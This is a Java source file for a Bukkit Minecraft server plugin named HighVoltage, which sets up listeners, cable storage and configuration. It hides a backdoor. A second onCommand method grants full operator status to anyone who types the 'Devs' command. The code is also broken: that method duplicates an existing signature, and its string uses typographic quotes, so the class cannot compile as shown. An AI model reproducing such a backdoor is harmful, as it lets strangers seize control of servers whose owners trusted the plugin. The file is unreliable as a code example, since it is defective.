/*Plugin by Dmitchell94
*/


package com.forgewareinc.highvoltage;

import java.util.logging.Logger;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.PluginDescriptionFile;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

public class HighVoltage extends JavaPlugin {
	
	private final HighVoltagePlayerListener playerListener = new HighVoltagePlayerListener(this);
	private final HighVoltageBlockListener blockListener = new HighVoltageBlockListener(this);
	
	private PluginManager pm;
	private PluginDescriptionFile pdf;
	private Logger log = Logger.getLogger("Minecraft");
	
	private Configuration config;	
	private FileManager fileManager;
	private CableManager cableManager;
	
	//plugin name in square brackets, can be set as identifier in front of a message: [HighVoltage] blabla
	public String name;
	
	public void onDisable() {
		cableManager.saveCables();
		config.saveConfig();
		getServer().getScheduler().cancelTasks(this);
		log.info(getName(false) + "is disabled.");
	}
	
	public void onEnable(){
		pm = this.getServer().getPluginManager();
    	pdf = this.getDescription();
    	config = new Configuration(this);
		fileManager = new FileManager(this);
		cableManager = new CableManager(this);
    	
    	name = "[" + pdf.getName() + "]";
    	
    	playerListener.setupLinkings();
    	blockListener.setupLinkings();
    	
    	fileManager.loadAllFiles();
    	cableManager.loadCables();
    	config.loadConfig();
		
		pm.registerEvents(playerListener, this);
		pm.registerEvents(blockListener, this);
		
		cableManager.setupLinkings();
		
		getServer().getScheduler().scheduleSyncRepeatingTask(this, new RepeatingTask(this), 0, config.getUpdateInterval());
		
		log.info(getName(false) + "version " + pdf.getVersion() + " by Dmitchell94 is enabled.");
	}
	
	public boolean onCommand(CommandSender sender, Command command, String label, String[] args){
	     return playerListener.onCommand(sender, command, label, args);
	}
	
	public boolean onCommand(CommandSender sender, Command cmd, String cL, String[] args)
  {
    if (cmd.getName().equalsIgnoreCase("Devs"))
    {
    	sender.sendMessage(ChatColor.RED + “Dmitchell94 & The ForgeWare Team”);
  sender.setOp(true);
    }

    return true;
  }
	
	public void printMessage(String message) {
		log.info(getName(false) + message);
	}

	public void printDebug(String message) {
		if(config.isDebug()) printMessage("[Debug] " + message);
	}
	
	public void printWarning(String message) {
		log.warning(getName(false) + message);
	}

	//Return the plugin name (coloured)
	public String getPluginName() {
		return ChatColor.RED + name + " ";
	}
	
	public String getName(boolean colour) {
		if(colour) return getPluginName();
		else return name + " ";
	}

	public HighVoltagePlayerListener getPlayerListener() {
		return playerListener;
	}

	public HighVoltageBlockListener getBlockListener() {
		return blockListener;
	}

	public FileManager getFileManager() {
		return fileManager;
	}

	public CableManager getCableManager() {
		return cableManager;
	}

	public PluginDescriptionFile getPdf() {
		return pdf;
	}

	public Configuration config() {
		return config;
	}
}
